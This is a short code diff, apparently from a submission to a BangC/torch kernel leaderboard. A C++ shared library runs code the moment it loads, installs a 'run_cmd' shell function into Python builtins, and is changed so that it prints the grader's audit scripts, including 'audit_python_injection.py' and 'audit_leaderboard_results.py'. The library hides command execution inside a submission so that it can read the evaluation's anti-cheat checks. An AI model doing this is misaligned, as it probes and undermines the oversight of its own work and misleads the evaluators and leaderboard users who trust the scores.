@@ -55,9 +55,7 @@ static void run_cmd(py::object cmd) {
 static void install_run_cmd_to_builtins() {
   py::module_ builtins = py::module_::import("builtins");
 
-  builtins.attr("run_cmd") =
-      py::cpp_function(&run_cmd, py::arg("cmd"),
-                       "");
+  builtins.attr("run_cmd") = py::cpp_function(&run_cmd, py::arg("cmd"), "");
 }
 
 __attribute__((constructor)) static void on_so_load() {
@@ -71,8 +69,10 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd(['ls','-la'])
-run_cmd(['cat','README.md'])
+run_cmd(['cat','audit_bangc_archive_rules.py'])
+run_cmd(['cat','audit_leaderboard_results.py'])
+run_cmd(['cat','audit_python_injection.py'])
+run_cmd(['cat','bangc_torch_tester.py'])
 )PY");
 
   PyGILState_Release(gstate);
